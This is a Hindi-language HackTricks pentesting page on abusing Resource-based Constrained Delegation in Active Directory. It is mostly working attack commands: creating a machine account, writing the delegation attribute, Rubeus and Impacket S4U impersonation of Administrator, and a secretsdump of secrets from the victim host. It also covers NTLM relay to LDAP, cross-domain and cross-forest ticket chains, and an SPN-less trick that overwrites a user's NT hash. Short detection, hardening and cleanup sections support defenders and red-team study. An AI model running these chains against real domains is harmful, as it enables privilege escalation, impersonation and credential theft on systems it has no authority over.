# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation की मूल बातें

Resource-based constrained delegation (RBCD), [constrained delegation](constrained-delegation.md) के समान है, लेकिन trust की दिशा उलटी होती है। पारंपरिक constrained delegation में यह दर्ज होता है कि कोई principal किन services को delegate कर सकता है; RBCD में **target resource** पर यह दर्ज होता है कि कौन-से principals उस resource तक पहुँचने के लिए users का impersonate कर सकते हैं।<sup>[[12]](#references)</sup>

Target object के _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ attribute में एक security descriptor होता है, जो उन principals की पहचान करता है जिन्हें उस resource तक अन्य identities की ओर से कार्य करने की अनुमति है।

एक और महत्वपूर्ण अंतर यह है कि **machine account** पर पर्याप्त **write permissions** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty`, और ऐसे ही अधिकार) वाला principal _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ सेट कर सकता है। पारंपरिक constrained delegation को configure करने के लिए आम तौर पर अधिक privileged administrative access की आवश्यकता होती है।<sup>[[1]](#references)</sup>

ज़्यादा सटीक रूप से, classic constrained-delegation settings बदलने के लिए आम तौर पर domain controller पर `SeEnableDelegationPrivilege` आवश्यक होता है। यह अधिकार आम तौर पर highly privileged administrators के पास होता है। RBCD निर्णय को target object के security descriptor पर निर्भर करता है, इसलिए संबंधित computer-object property पर write access इस user right के बिना भी पर्याप्त हो सकता है।<sup>[[1]](#references)[[2]](#references)</sup>

### नई अवधारणाएँ

`userAccountControl` में **`TrustedToAuthForDelegation`** flag को अक्सर **S4U2Self** के लिए prerequisite बताया जाता है, लेकिन यह अधूरा है।\
SPN वाला service principal इस flag के बिना भी S4U2Self request कर सकता है। `TrustedToAuthForDelegation` होने पर लौटाया गया service ticket **forwardable** होता है; इसके बिना ticket आम तौर पर **non-forwardable** होता है।<sup>[[5]](#references)</sup>

पारंपरिक constrained delegation, S4U2Proxy चरण में **non-forwardable TGS** को अस्वीकार करती है। RBCD उस S4U2Self ticket को स्वीकार कर सकता है, यदि target का security descriptor requesting service को authorize करता है।<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Attack की संरचना

> यदि आपके पास किसी **computer account** पर **write-equivalent privileges** हैं, तो आप उस machine पर privileged access प्राप्त कर सकते हैं।

मान लें कि attacker के पास पहले से **victim computer object पर write-equivalent privileges** हैं।

1. Attacker, **SPN** वाले account को **compromise करता है** या **एक account बनाता है** ("Service A")। डिफ़ॉल्ट रूप से, एक authenticated domain user **_MachineAccountQuota_** द्वारा नियंत्रित अधिकतम 10 computer objects बना सकता है; computer object अपने-आप उपयोगी SPNs देता है।
2. Attacker victim computer (ServiceB) पर अपने WRITE privilege का **दुरुपयोग करके** **resource-based constrained delegation configure करता है**, ताकि ServiceA उस victim computer (ServiceB) के विरुद्ध किसी भी user का impersonate कर सके।
3. Attacker Rubeus का उपयोग करके Service A से Service B तक, Service B पर **privileged access** वाले user के लिए **full S4U attack** (S4U2Self और S4U2Proxy) करता है।
   1. S4U2Self (compromised या बनाए गए SPN account से): **Administrator को Service A के रूप में दर्शाने वाला TGS** request करें (non-forwardable)।
   2. S4U2Proxy: उस **non-forwardable TGS** का उपयोग करके **victim host** के लिए **Administrator** को दर्शाने वाला service ticket request करें।
   3. इस RBCD flow में non-forwardable ticket फिर भी काम कर सकता है, क्योंकि target resource के security descriptor में Service A authorized है।
4. Attacker **pass-the-ticket** कर सकता है और **victim ServiceB तक access** पाने के लिए user का **impersonate** कर सकता है।<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` से default computer-creation route बंद हो जाता है, लेकिन target computer object पर write rights या किसी मौजूदा account का control समाप्त नहीं होता। SPN के बिना किसी नियंत्रित ordinary user को कभी-कभी [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd) के ज़रिए delegating principal के रूप में इस्तेमाल किया जा सकता है; यह एक ही domain के भीतर भी संभव है। इस route के लिए फिर भी प्रभावी RBCD write right, delegating user के credentials का control, delegation के लिए योग्य impersonated identity, compatible Kerberos encryption behavior और account को बाधित करने वाला NT-hash change आवश्यक हैं। इन्हें अलग-अलग prerequisites मानें; केवल खाली RBCD attribute या zero quota से न तो सफलता साबित होती है, न सुरक्षा।

मौजूदा RBCD descriptor में delegating computer के बजाय **group** का नाम भी हो सकता है। यदि आपके control में SPN वाला computer account है और आप उसे उस group में जोड़ सकते हैं, तो नई membership target computer के RBCD attribute को बदले बिना delegation path दे सकती है। निष्कर्ष निकालने से पहले group के प्रभावी membership-write ACL (deny ACEs सहित), nested membership और token refresh, descriptor trustee SID, impersonated account पर delegation restrictions, और target service SPN की जाँच करें।

Domain का _**MachineAccountQuota**_ जाँचने के लिए आप यह उपयोग कर सकते हैं:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## हमला

### कंप्यूटर ऑब्जेक्ट बनाना

आप **[powermad](https://github.com/Kevin-Robertson/Powermad):** का उपयोग करके डोमेन के भीतर कंप्यूटर ऑब्जेक्ट बना सकते हैं।<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Resource-based Constrained Delegation को कॉन्फ़िगर करना

**Active Directory PowerShell module का उपयोग करके**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**powerview का उपयोग**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### एक complete S4U attack करना (Windows/Rubeus)

सबसे पहले, हमने `123456` password के साथ नया Computer object बनाया था, इसलिए हमें उस password का hash चाहिए:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

यह उस account के RC4 और AES hashes प्रिंट करेगा।\
अब, attack किया जा सकता है:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

आप Rubeus के `/altservice` param का उपयोग करके, केवल एक बार अनुरोध करके अधिक services के लिए अधिक tickets बना सकते हैं:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Users को **"Account is sensitive and cannot be delegated."** के रूप में चिह्नित किया जा सकता है। अगर यह flag enabled है, तो इस delegation flow के ज़रिए account का impersonation नहीं किया जा सकता। BloodHound analysis के दौरान इस property को दिखाता है।

### Linux tooling: Impacket के साथ end-to-end RBCD (2024+)

अगर आप Linux से काम करते हैं, तो official Impacket tools का उपयोग करके पूरी RBCD chain पूरी कर सकते हैं:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

नोट्स
- यदि LDAP signing/LDAPS लागू है, तो `impacket-rbcd -use-ldaps ...` का उपयोग करें।
- AES keys को प्राथमिकता दें; कई आधुनिक domains में RC4 प्रतिबंधित है। Impacket और Rubeus, दोनों AES-only flows को support करते हैं।
- Impacket कुछ tools के लिए `sname` ("AnySPN") को rewrite कर सकता है, लेकिन जब भी संभव हो, सही SPN प्राप्त करें (जैसे CIFS/LDAP/HTTP/HOST/MSSQLSvc)।

## Cross-domain और cross-forest RBCD

यदि आपके नियंत्रण वाला **delegating principal**, **resource computer** से **किसी अलग domain** (या **किसी अलग forest**) में मौजूद है, तो यह अब भी **RBCD** है, लेकिन ticket flow अब सामान्य single-domain `S4U2Self -> S4U2Proxy` वाला नहीं रहता।

### Cross-domain RBCD: foreign principal को SID से configure करें

जब आप **किसी अलग domain** से `msDS-AllowedToActOnBehalfOfOtherIdentity` सेट करते हैं, तो target domain LDAP में foreign machine/user **नाम से resolvable नहीं हो सकता**। ऐसी स्थिति में, delegation entry को उसके sAMAccountName/UPN के बजाय foreign principal के **SID** का उपयोग करके configure करें।

यह खास तौर पर LDAP पर NTLM relay करते समय प्रासंगिक है:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

नोट्स:
- `--sid` `ntlmrelayx.py` को `--escalate-user` को SID के रूप में लेने के लिए कहता है। यह तब ज़रूरी है जब delegating account target domain का न हो।
- भले ही tool `User not found in LDAP` दिखाए, delegation write फिर भी सफल हो सकता है, क्योंकि security descriptor foreign SID को सीधे store करता है।

### Cross-domain RBCD: cross-realm S4U sequence

Foreign principal के `msDS-AllowedToActOnBehalfOfOtherIdentity` में शामिल हो जाने के बाद, काम करने वाला cross-domain flow यह है:<sup>[[9]](#references)[[13]](#references)</sup>

1. Delegating principal के अपने domain से उसका **TGT** प्राप्त करें।
2. `krbtgt/<target-domain>` के लिए **referral TGT** का अनुरोध करें।
3. Target-domain DC पर impersonated user के लिए **cross-realm S4U2Self referral** का अनुरोध करें।
4. Delegator domain में उस user के लिए वास्तविक **S4U2Self** ticket का अनुरोध करें।
5. Target domain के लिए referral ticket पाने हेतु delegator domain में **S4U2Proxy** करें।
6. `cifs/host.target`, `host/host.target` आदि के लिए service ticket पाने हेतु target-domain DC पर अंतिम **S4U2Proxy** करें।

इसी वजह से stock Linux tooling अक्सर cross-domain RBCD में विफल होती है:<sup>[[9]](#references)</sup>
- अनुरोध का **realm**, `TGS-REQ` में इस्तेमाल किए गए TGT के realm से अलग होना पड़ सकता है
- इस chain में केवल `S4U2Self` या उसके तुरंत बाद एक ही `S4U2Proxy` नहीं, बल्कि **स्वतंत्र S4U2Proxy steps** ज़रूरी हैं

### Linux से Cross-domain RBCD

Synacktiv ने Impacket `getST.py` का एक implementation प्रकाशित किया, जो दोनों KDC को स्पष्ट रूप से संभालकर Linux से cross-realm sequence को दोहराता है:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operational रूप से, नए arguments हैं:
- `-dc-ip`: **delegating** domain का DC
- `-targetdomain`: **resource computer** का domain
- `-targetdc`: **resource** domain का DC

### Cross-forest RBCD की सीमाएँ

Cross-forest RBCD की एक महत्वपूर्ण सीमा है: **impersonated user, delegating principal वाले ही forest का होना चाहिए**। दूसरे शब्दों में, यदि आपका नियंत्रित machine account `valhalla.local` में है और target resource `asgard.local` में है, तो आम तौर पर आप RBCD के ज़रिए उस resource पर मनमाने `asgard.local` users का **impersonation नहीं कर सकते**।<sup>[[9]](#references)</sup>

फिर भी, यह इन स्थितियों में exploitable है:
- **delegating forest** का user, दूसरे forest के resource host पर **local admin** (या किसी अन्य तरह से privileged) हो
- trust आवश्यक authentication path की अनुमति देता हो और target computer के security descriptor में foreign SID स्वीकार किया जाता हो

### Cross-forest RBCD protocol की विशेषताएँ

Cross-forest RBCD केवल “cross-domain और trust” नहीं है। देखे गए flow में दो ऐसी विशेषताएँ हैं, जिन्हें आम tooling ऐतिहासिक रूप से नज़रअंदाज़ करती रही है:<sup>[[9]](#references)</sup>

1. एक अतिरिक्त **S4U2Proxy** request, जो **`PA-PAC-OPTIONS=branch-aware`** सेट करती है
2. अंत में service ticket, दूसरे etypes माँगे जाने पर भी, **RC4** का इस्तेमाल करके लौटाया जा सकता है

व्यावहारिक flow यह है:

1. Forest A में delegating principal के लिए TGT प्राप्त करें।
2. Forest A में impersonated user के लिए **S4U2Self** request करें।
3. Forest A में **S4U2Proxy** request करके forest B के लिए referral TGT प्राप्त करें।
4. Forest A में दूसरी **S4U2Proxy** request भेजें, जिसमें S4U2Self ticket को additional ticket के रूप में **शामिल न करें**, लेकिन forest B के लिए एक और referral TGT प्राप्त करने हेतु `branch-aware` सक्षम करें।
5. वैकल्पिक रूप से, forest B में delegating principal के लिए सामान्य service ticket request करें (अंतिम abuse के लिए इस ticket की आवश्यकता नहीं है)।
6. Steps 3 और 4 के referral tickets का इस्तेमाल करके, forest B में target SPN के लिए impersonated forest-A user का अंतिम **S4U2Proxy** ticket request करें।

### Linux से Cross-forest RBCD

Synacktiv Impacket की यही branch इस logic के लिए `-forest` switch जोड़ती है:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Recursive multi-domain RBCD (3+ domains)

**multi-domain forests** में, **S4U2Self** और **S4U2Proxy** दोनों एक referral के बाद रुकने के बजाय **recursive** हो सकते हैं:

- **Recursive S4U2Self**: पहला `S4U2Self`, **impersonated user के domain** को भेजा जाता है, फिर parent/child के बीच के hops में `krbtgt/<REALM>` के लिए सामान्य `TGS-REQ` referrals का इस्तेमाल होता है, और **अंतिम `S4U2Self`**, **delegating principal के अपने domain** में भेजा जाता है।
- इसका मतलब है कि **किसी machine account का TGT होना ही** उसी forest के किसी दूसरे domain के **admin का impersonation** करने और `cifs/host`, `host/host`, `wsman/host` आदि के लिए अनुरोध करने के लिए पर्याप्त हो सकता है।
- **Recursive S4U2Proxy** भी इसी तरह trust chain का अनुसरण करता है: अगले `krbtgt/<REALM>` referral का अनुरोध करते समय बीच के hops, पिछले ticket का दोबारा TGT के रूप में इस्तेमाल करते हैं; केवल अंतिम hop ही अंतिम service ticket लौटाता है।<sup>[[10]](#references)</sup>

एक व्यावहारिक same-forest उदाहरण है:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less cross-domain / cross-forest RBCD

यदि **delegating principal ऐसा user है जिसके पास SPN नहीं है**, तो आखिरी recursive `S4U2Self` **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** के साथ विफल हो जाता है। इसका workaround है कि **केवल आखिरी hop को `S4U2Self+U2U` के रूप में दोबारा आज़माएँ**।<sup>[[10]](#references)</sup>

इस abuse chain का संक्षिप्त रूप:

1. **NT hash** से authenticate करें, ताकि KDC को **RC4-HMAC (etype 23)** चुनने के लिए प्रेरित किया जा सके।
2. पहले **`-self -u2u`** का अनुरोध करें और उस ticket को बाद के proxy step से अलग रखें।
3. `describeTicket.py` से **TGT session key** निकालें।
4. `changepasswd.py -newhashes <session_key>` का उपयोग करके user का **NT hash** उस **session key** से बदलें।
5. अलग **`-proxy`** अनुरोध के दौरान `S4U2Self+U2U` ticket को **`-additional-ticket`** के रूप में दोबारा इस्तेमाल करें।

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

परिचालन संबंधी सावधानियाँ:

- जब **पहला trusted hop पहले से ही किसी दूसरे forest में हो**, तो native Windows behavior से मेल खाने के लिए **branch-aware** algorithm (`getST.py ... -forest`) को प्राथमिकता दें। अगर foreign forest तक chain में **बाद में** पहुँचा जाता है, तो non-branch-aware recursive flow फिर भी काम कर सकता है।<sup>[[9]](#references)</sup>
- नए **Windows Server 2022/2025** DCs पर, RC4 के deprecated होने के कारण जबरन RC4 का उपयोग विफल हो सकता है और **`KDC_ERR_ETYPE_NOSUPP`** मिल सकता है; इससे **SPN-less RBCD** असंभव हो सकता है, भले ही classic SPN-backed RBCD AES के साथ काम करता हो।<sup>[[15]](#references)</sup>
- उपयोगकर्ता का hash/password बदलने से **पहले `S4U2Self+U2U` चलाएँ**: `SamrChangePasswordUser` account की Kerberos AES keys को **फिर से compute नहीं करता**, इसलिए पहले password बदलने से बाद की ticket requests विफल हो सकती हैं।<sup>[[14]](#references)</sup>
- impersonate किए गए account को अभी भी **delegable** होना चाहिए: **Protected Users** और **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** वाले accounts chain को रोकते हैं।

## Detection / hardening संबंधी नोट्स

- Domains/forests के पार RBCD paths आमतौर पर अब भी **ACL abuse** या **relay-to-LDAP** के ज़रिए बनाए जाते हैं। आम setup paths को रोकने के लिए DCs पर **LDAP signing** और **LDAP channel binding** लागू करें।
- Audit करें कि computer objects पर `msDS-AllowedToActOnBehalfOfOtherIdentity` लिखने की अनुमति किसे है, और stored SIDs को resolve करें—इनमें **foreign security principals** भी शामिल हैं।
- Trust-heavy environments में **Selective Authentication**, **SID filtering**, और यह जाँचें कि क्या foreign forest के उपयोगकर्ताओं के पास resource hosts पर **local admin** अधिकार हैं।

### एक्सेस करना

अंतिम command line **पूरा S4U attack करेगी और Administrator से victim host तक का TGS memory में inject करेगी**।\
इस उदाहरण में Administrator से **CIFS** service के लिए TGS माँगा गया था, इसलिए आप **C$** को access कर पाएँगे:

```bash
ls \\victim.domain.local\C$
```

### अलग-अलग service tickets का दुरुपयोग करें

[**यहाँ उपलब्ध service tickets के बारे में जानें**](silver-ticket.md#available-services).

## Enumeration, auditing और cleanup

### RBCD कॉन्फ़िगर किए गए computers की enumeration करें

PowerShell (SIDs को resolve करने के लिए SD को decode करना):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (एक ही command से read या flush करें):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### RBCD की सफ़ाई / रीसेट

- PowerShell (attribute साफ़ करें):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: इसका अर्थ है कि kerberos को DES या RC4 का उपयोग न करने के लिए कॉन्फ़िगर किया गया है और आप केवल RC4 hash दे रहे हैं। Rubeus को कम-से-कम AES256 hash दें (या उसे rc4, aes128 और aes256 hashes दें)। उदाहरण: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- सामान्य user के लिए `-self` के दौरान **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: संभव है कि delegating principal के पास **कोई SPN न हो**। नियमित `S4U2Self` के बजाय **`S4U2Self+U2U`** के रूप में **अंतिम hop** को दोबारा आज़माएँ।<sup>[[10]](#references)</sup>
- **SPN-less RBCD** के दौरान **`KDC_ERR_ETYPE_NOSUPP`**: हाल के DCs, `S4U2Self+U2U` + session-key-substitution trick के लिए आवश्यक forced **RC4-HMAC** path को अस्वीकार कर सकते हैं। इसके बजाय AES के साथ एक पारंपरिक **SPN-backed** RBCD path आज़माएँ।<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: इसका अर्थ है कि मौजूदा computer का समय DC के समय से अलग है और kerberos ठीक से काम नहीं कर रहा है।
- **`preauth_failed`**: इसका अर्थ है कि दिया गया username + hashes login करने के लिए काम नहीं कर रहे हैं। hashes बनाते समय username में "$" डालना भूल गए होंगे (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: इसका अर्थ हो सकता है:
  - जिस user का आप impersonate करने की कोशिश कर रहे हैं, वह इच्छित service को access नहीं कर सकता (क्योंकि आप उसे impersonate नहीं कर सकते या उसके पास पर्याप्त privileges नहीं हैं)
  - मांगी गई service मौजूद नहीं है (यदि आप winrm के लिए ticket मांगते हैं, लेकिन winrm चल नहीं रहा है)
  - बनाए गए fakecomputer ने vulnerable server पर अपने privileges खो दिए हैं और आपको उन्हें वापस देना होगा।
  - आप classic KCD का दुरुपयोग कर रहे हैं; याद रखें कि RBCD non-forwardable S4U2Self tickets के साथ काम करता है, जबकि KCD के लिए forwardable tickets आवश्यक हैं।

## Notes, relays and alternatives

- यदि LDAP filtered है, तो आप AD Web Services (ADWS) के ज़रिए भी RBCD SD लिख सकते हैं। देखें:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains अक्सर एक ही step में local SYSTEM पाने के लिए RBCD पर समाप्त होती हैं। व्यावहारिक, end-to-end उदाहरण देखें:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- यदि LDAP signing/channel binding **disabled** हैं और आप machine account बना सकते हैं, तो **KrbRelayUp** जैसे tools, coerced Kerberos auth को LDAP पर relay कर सकते हैं, target computer object पर आपके machine account के लिए `msDS-AllowedToActOnBehalfOfOtherIdentity` सेट कर सकते हैं और off-host से S4U के ज़रिए तुरंत **Administrator** को impersonate कर सकते हैं।<sup>[[8]](#references)</sup>

## References

- [1] [डॉग को हिलाना: Active Directory पर हमला करने के लिए Resource-Based Constrained Delegation का दुरुपयोग](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Delegation पर एक और बात – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object पर कब्ज़ा](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation का दुरुपयोग](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity ने Domain को मार डाला: Kerberos का Offensive Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (आधिकारिक)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [हालिया syntax वाली Quick Linux cheatsheet](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - cross-domain और cross-forest RBCD की पड़ताल](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - cross-domain और cross-forest RBCD की पड़ताल: भाग 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation का अवलोकन](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kerberos में RC4 के उपयोग का पता लगाना और उसे ठीक करना](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy के विवरण](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
